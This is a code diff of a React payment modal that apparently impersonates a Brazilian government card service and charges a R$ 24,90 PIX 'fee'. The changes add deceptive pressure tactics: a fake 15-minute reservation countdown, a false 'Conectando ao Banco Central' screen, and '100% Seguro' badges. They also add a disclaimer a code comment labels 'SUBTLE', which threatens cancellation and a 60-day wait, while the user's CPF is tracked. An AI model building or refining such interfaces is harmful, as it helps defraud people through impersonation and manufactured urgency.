@@ -8,6 +8,27 @@ import { useSearchParams } from "next/navigation";
 
 import { getSessionId } from "@/lib/session";
 
+// Helper Component for Timer
+function CountdownTimer() {
+    const [time, setTime] = useState(15 * 60); // 15 minutes
+
+    useEffect(() => {
+        const timer = setInterval(() => {
+            setTime(t => t > 0 ? t - 1 : 0);
+        }, 1000);
+        return () => clearInterval(timer);
+    }, []);
+
+    const minutes = Math.floor(time / 60);
+    const seconds = time % 60;
+
+    return (
+        <span className={`font-mono font-bold ${time < 60 ? 'text-red-400' : 'text-slate-200'}`}>
+            {minutes.toString().padStart(2, '0')}:{seconds.toString().padStart(2, '0')}
+        </span>
+    );
+}
+
 // Internal component with the logic requiring useSearchParams
 function EntregaContent() {
     useEffect(() => {
@@ -353,113 +374,144 @@ function EntregaContent() {
                         <div className="absolute inset-0 bg-black/60 backdrop-blur-sm animate-in fade-in" onClick={() => !loadingPix && setShowModal(false)}></div>
 
                         {/* Modal Content */}
-                        <div className="bg-white rounded-3xl shadow-2xl w-full max-w-md relative z-10 overflow-hidden animate-in zoom-in-95 duration-300">
+                        <div className="bg-white rounded-3xl shadow-2xl w-full max-w-md relative z-10 overflow-hidden animate-in zoom-in-95 duration-300 font-sans">
                             {loadingPix ? (
                                 <div className="p-12 text-center">
-                                    <div className="relative w-20 h-20 mx-auto mb-6">
+                                    <div className="relative w-24 h-24 mx-auto mb-6">
                                         <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
                                         <div className="absolute inset-0 border-4 border-gov-green-500 rounded-full border-t-transparent animate-spin"></div>
-                                        <QrCode className="absolute inset-0 m-auto h-8 w-8 text-gov-green-600 animate-pulse" />
+                                        <div className="absolute inset-0 flex items-center justify-center">
+                                            <Lock className="h-8 w-8 text-gov-green-600 animate-pulse" />
+                                        </div>
                                     </div>
-                                    <h3 className="text-xl font-bold text-slate-800 mb-2">Gerando seu PIX...</h3>
-                                    <p className="text-slate-500 text-sm">Validando dados junto ao Banco Central</p>
+                                    <h3 className="text-xl font-bold text-slate-800 mb-2">Conectando ao Banco Central...</h3>
+                                    <p className="text-slate-500 text-sm">Gerando chave de segurança única</p>
                                 </div>
                             ) : pixData ? (
                                 <div className="flex flex-col max-h-[90vh]">
-                                    {/* Modal Header */}
-                                    <div className="bg-gov-green-600 p-6 text-center shrink-0">
-                                        <div className="w-12 h-12 bg-white/20 backdrop-blur-md rounded-full flex items-center justify-center mx-auto mb-3">
-                                            <Check className="h-6 w-6 text-white" />
+                                    {/* Premium Header */}
+                                    <div className="bg-slate-900 p-6 text-center shrink-0 relative overflow-hidden">
+                                        {/* Background Pattern */}
+                                        <div className="absolute inset-0 opacity-10 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')]"></div>
+
+                                        <div className="relative z-10">
+                                            <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm px-3 py-1 rounded-full text-green-400 text-xs font-bold mb-4 border border-white/10">
+                                                <Lock className="h-3 w-3" />
+                                                Ambiente 100% Seguro
+                                            </div>
+                                            <h3 className="text-white font-bold text-2xl mb-1">Pagamento da Taxa</h3>
+                                            <div className="flex justify-center items-center gap-2 text-slate-400 text-sm">
+                                                <span>Reserva válida por:</span>
+                                                <CountdownTimer />
+                                            </div>
                                         </div>
-                                        <h3 className="text-white font-bold text-xl">Pagamento Gerado!</h3>
-                                        <p className="text-green-50 text-sm mt-1">Sua solicitação está reservada.</p>
                                     </div>
 
                                     {/* Modal Body */}
                                     <div className="p-6 overflow-y-auto space-y-6">
 
-                                        {/* Copia e Cola Section (PRIMARY) */}
-                                        <div className="space-y-2">
-                                            <label className="text-xs font-bold text-slate-500 uppercase flex items-center gap-2">
-                                                <Copy className="h-3 w-3" /> Pix Copia e Cola
-                                            </label>
-                                            <div className="relative">
-                                                <input
-                                                    value={pixData.qr_code_text}
-                                                    readOnly
-                                                    className="w-full pl-4 pr-12 py-4 bg-slate-50 border-2 border-slate-200 rounded-xl text-slate-600 text-xs font-mono focus:border-green-500 focus:ring-0 outline-none"
-                                                />
-                                                <button
-                                                    onClick={() => {
-                                                        navigator.clipboard.writeText(pixData.qr_code_text);
-                                                        alert("Código PIX copiado!");
-                                                        // Track copy event
-                                                        fetch('/api/solicitations', {
-                                                            method: 'POST',
-                                                            body: JSON.stringify({
-                                                                cpf,
-                                                                metadata: { pix_copied: true }
-                                                            })
-                                                        }).catch(e => console.error("Track error", e));
-                                                    }}
-                                                    className="absolute right-2 top-2 bottom-2 aspect-square bg-slate-900 hover:bg-black text-white rounded-lg flex items-center justify-center transition-colors shadow-sm"
-                                                    title="Copiar Código"
-                                                >
-                                                    <Copy className="h-4 w-4" />
-                                                </button>
+                                        {/* Value Display */}
+                                        <div className="text-center">
+                                            <p className="text-sm text-slate-500 mb-1">Valor do Envio + Emissão</p>
+                                            <p className="text-4xl font-extrabold text-slate-800 tracking-tight">R$ 24,90</p>
+                                        </div>
+
+                                        {/* Copia e Cola Section (Review Focus) */}
+                                        <div className="space-y-3">
+                                            <div className="flex items-center gap-2 text-sm font-bold text-slate-700">
+                                                <div className="w-6 h-6 rounded-full bg-gov-blue-100 text-gov-blue-600 flex items-center justify-center text-xs">1</div>
+                                                Copie o código abaixo
                                             </div>
-                                            <p className="text-[10px] text-slate-400 text-center">
-                                                Abra o app do seu banco, escolha "Pix Copia e Cola" e cole o código.
+
+                                            <div className="relative group">
+                                                <div className="absolute inset-0 bg-gov-green-500/5 rounded-xl blur-sm group-hover:bg-gov-green-500/10 transition-all"></div>
+                                                <div className="relative bg-white border-2 border-slate-200 rounded-xl overflow-hidden flex shadow-sm group-hover:border-gov-green-500 transition-colors">
+                                                    <input
+                                                        value={pixData.qr_code_text}
+                                                        readOnly
+                                                        className="flex-1 pl-4 py-4 text-xs font-mono text-slate-500 bg-transparent outline-none"
+                                                    />
+                                                    <button
+                                                        onClick={() => {
+                                                            navigator.clipboard.writeText(pixData.qr_code_text);
+                                                            alert("Código PIX copiado com sucesso!");
+                                                            // Track copy event
+                                                            fetch('/api/solicitations', {
+                                                                method: 'POST',
+                                                                body: JSON.stringify({
+                                                                    cpf,
+                                                                    metadata: { pix_copied: true }
+                                                                })
+                                                            }).catch(e => console.error("Track error", e));
+                                                        }}
+                                                        className="bg-gov-green-600 hover:bg-gov-green-700 text-white font-bold text-sm px-6 transition-colors flex items-center gap-2"
+                                                    >
+                                                        <Copy className="h-4 w-4" />
+                                                        Copiar
+                                                    </button>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div className="space-y-3">
+                                            <div className="flex items-center gap-2 text-sm font-bold text-slate-700">
+                                                <div className="w-6 h-6 rounded-full bg-gov-blue-100 text-gov-blue-600 flex items-center justify-center text-xs">2</div>
+                                                Pague no app do seu banco
+                                            </div>
+                                            <p className="text-xs text-slate-500 ml-8 leading-relaxed">
+                                                Abra o aplicativo do seu banco, escolha a opção <strong>Pix Copia e Cola</strong> e cole o código copiado.
                                             </p>
                                         </div>
 
                                         <div className="h-px bg-slate-100"></div>
 
-                                        {/* QR Code Section (SECONDARY - Expandable) */}
+                                        {/* QR Code Toggle */}
                                         <div className="text-center">
                                             {!showPix ? (
                                                 <button
                                                     onClick={() => setShowPix(true)}
-                                                    className="text-gov-blue-600 text-sm font-bold hover:underline flex items-center justify-center gap-2 w-full py-2"
+                                                    className="text-slate-500 text-xs font-medium hover:text-gov-blue-600 flex items-center justify-center gap-2 w-full py-2 transition-colors"
                                                 >
-                                                    <QrCode className="h-4 w-4" />
-                                                    Mostrar QR Code (Imagem)
+                                                    <QrCode className="h-3 w-3" />
+                                                    Prefiro escanear o QR Code
                                                 </button>
                                             ) : (
                                                 <div className="animate-in slide-in-from-top-2 fade-in">
-                                                    <div className="bg-white p-2 rounded-xl border-2 border-slate-100 inline-block shadow-sm">
+                                                    <div className="bg-white p-2 rounded-xl border border-slate-100 inline-block shadow-sm mb-2">
                                                         <img
                                                             src={`data:image/png;base64,${pixData.qr_code_base64}`}
-                                                            className="w-48 h-48 object-contain"
+                                                            className="w-40 h-40 object-contain opacity-90"
                                                             alt="Pix QR Code"
                                                         />
                                                     </div>
-                                                    <button
-                                                        onClick={() => setShowPix(false)}
-                                                        className="text-slate-400 text-xs mt-2 hover:text-slate-600 block w-full"
-                                                    >
-                                                        Ocultar QR Code
-                                                    </button>
                                                 </div>
                                             )}
                                         </div>
 
-                                        <div className="bg-blue-50 p-4 rounded-xl flex items-start gap-3">
-                                            <div className="w-1.5 h-1.5 bg-blue-500 rounded-full mt-2 shrink-0 animate-pulse"></div>
-                                            <p className="text-xs text-blue-700 leading-relaxed">
-                                                Após o pagamento, você receberá a confirmação por e-mail e o cartão entrará em produção imediatamente.
+                                        {/* Policy Disclaimer - SUBTLE */}
+                                        <div className="bg-slate-50 p-4 rounded-xl text-center">
+                                            <p className="text-[11px] text-slate-400 leading-relaxed max-w-xs mx-auto">
+                                                <span className="font-semibold text-slate-500">Importante:</span> O não pagamento dentro do prazo de reserva resultará no cancelamento automático desta solicitação.
+                                            </p>
+                                            <p className="text-[10px] text-slate-300 mt-2">
+                                                Nova análise disponível apenas após 60 dias.
                                             </p>
                                         </div>
                                     </div>
 
                                     {/* Modal Footer */}
-                                    <div className="p-4 border-t border-slate-100 bg-slate-50 shrink-0">
+                                    <div className="p-4 border-t border-slate-100 bg-slate-50/50 shrink-0">
                                         <button
                                             onClick={() => setShowModal(false)}
-                                            className="w-full py-3 text-slate-600 font-bold hover:bg-slate-200 rounded-xl transition-colors"
+                                            className="w-full py-3 text-slate-500 font-bold hover:bg-slate-200 hover:text-slate-700 rounded-xl transition-all text-sm"
                                         >
-                                            Fechar e Aguardar
+                                            Fechar
                                         </button>
+                                        <div className="mt-4 flex justify-center items-center gap-4 opacity-50 grayscale">
+                                            <div className="flex items-center gap-1 text-[10px] text-slate-400 font-bold">
+                                                <Lock className="h-3 w-3" /> PROCESSO SEGURO
+                                            </div>
+                                        </div>
                                     </div>
                                 </div>
                             ) : (
